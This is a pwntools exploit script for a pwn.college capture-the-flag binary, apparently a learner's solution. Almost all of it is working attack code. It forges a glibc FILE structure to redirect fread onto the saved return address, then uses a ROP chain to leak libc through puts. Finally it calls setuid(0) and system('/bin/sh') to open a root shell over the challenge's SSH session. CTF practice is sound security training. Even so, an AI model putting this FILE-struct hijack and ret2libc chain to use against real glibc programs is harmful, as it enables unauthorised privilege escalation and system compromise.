from pwn import *
from time import sleep
context.binary=e=ELF("./babyfile_level4")
libc=e.libc
gs="""
set listsize 50
set $glibc_src_dir="../../glibc-2.31/"
source ~/add_src.py
b fread
b *__GI__IO_file_xsgetn
b *__GI__IO_file_read
b *0000000000401AB2
"""
_IO_EOF_SEEN=0x0010
_IO_NO_READS=0x0004
_IO_CURRENTLY_PUTTING=0x0800
_IO_IS_APPENDING=0x1000
_IO_IN_BACKUP=0x0100
_IO_FLAGS2_NOTCANCEL=2
_IO_MAGIC=0xFBAD0000 
_IO_MAGIC_MASK=0xFFFF0000
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gdbscript=gs)
        pause()
elif args.REMOTE:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyfile_level4")
sleep(1)
p.recvuntil(b"[LEAK] return address is stored at: 0x")
ret_addr=int(p.recvuntil(b"\n").rstrip().decode(),16)
p.recvuntil(b"fp -> 0x")
fp=int(p.recvuntil(b"\n").rstrip().decode(),16)
p.sendafter(b"Now reading from stdin directly to the FILE struct.",
               p64(0)+
               #make 0 < have < want where want=0x100 ; have=fp->_IO_read_end - fp->_IO_read_ptr
               # ==> s = __mempcpy (s, fp->_IO_read_ptr, have); // = &authenticated
               p64(ret_addr)+p64(ret_addr+0x10)+p64(ret_addr)+ #_IO_read_ptr, _IO_read_end, _IO_read_base
               p64(0)+p64(0)+p64(0)+ #writes
               p64(ret_addr)+p64(ret_addr+0x101)+ # buf_base, buf_end
               # (fp->_IO_buf_base  && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
               # ==> call __underflow (fp)
               # ==> call _IO_new_file_underflow(fp)
               # ==> flag =0 pass many conditons
               # ==> call  _IO_SYSREAD (fp, fp->_IO_buf_base,fp->_IO_buf_end - fp->_IO_buf_base);
               b"\x00"*(112-8*9)+p32(0)+p32(0)+
               b"\x00"*(130-112-8)+b"\x00"+
               b"\x00"*(136-130-1)+p64(e.sym.fp+4)#+ #_lock
               #b"\x00"*(216-136-8)+b"\x98"
)
p.recvuntil(b"0}\n")
pause()
rdi_ret=0x0000000000401bf3
payload=b''
payload+=p64(rdi_ret)
payload+=p64(e.got.puts)
payload+=p64(e.plt.puts)
payload+=p64(e.sym.challenge)
p.send(payload+b"\0"*(0x101-len(payload)))
libc.address=int(p.recv(6)[::-1].hex(),16)-libc.sym.puts
log.info(f"libc @ {hex(libc.address)}")
pause()
p.recvuntil(b"[LEAK] return address is stored at: 0x")
ret_addr=int(p.recvuntil(b"\n").rstrip().decode(),16)
p.recvuntil(b"fp -> 0x")
fp=int(p.recvuntil(b"\n").rstrip().decode(),16)
p.sendafter(b"Now reading from stdin directly to the FILE struct.",
               p64(0)+
               #make 0 < have < want where want=0x100 ; have=fp->_IO_read_end - fp->_IO_read_ptr
               # ==> s = __mempcpy (s, fp->_IO_read_ptr, have); // = &authenticated
               p64(ret_addr)+p64(ret_addr+0x10)+p64(ret_addr)+ #_IO_read_ptr, _IO_read_end, _IO_read_base
               p64(0)+p64(0)+p64(0)+ #writes
               p64(ret_addr)+p64(ret_addr+0x101)+ # buf_base, buf_end
               # (fp->_IO_buf_base  && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
               # ==> call __underflow (fp)
               # ==> call _IO_new_file_underflow(fp)
               # ==> flag =0 pass many conditons
               # ==> call  _IO_SYSREAD (fp, fp->_IO_buf_base,fp->_IO_buf_end - fp->_IO_buf_base);
               b"\x00"*(112-8*9)+p32(0)+p32(0)+
               b"\x00"*(130-112-8)+b"\x00"+
               b"\x00"*(136-130-1)+p64(e.sym.fp+4)#+ #_lock
               #b"\x00"*(216-136-8)+b"\x98"
)
pause()
payload=b''
payload+=p64(rdi_ret)
payload+=p64(0)
payload+=p64(libc.sym.setuid)
payload+=p64(rdi_ret)
payload+=p64(next(libc.search(b"/bin/sh")))
payload+=p64(libc.sym.system)
p.sendline(payload+b"\0"*(0x101-len(payload)))
p.interactive()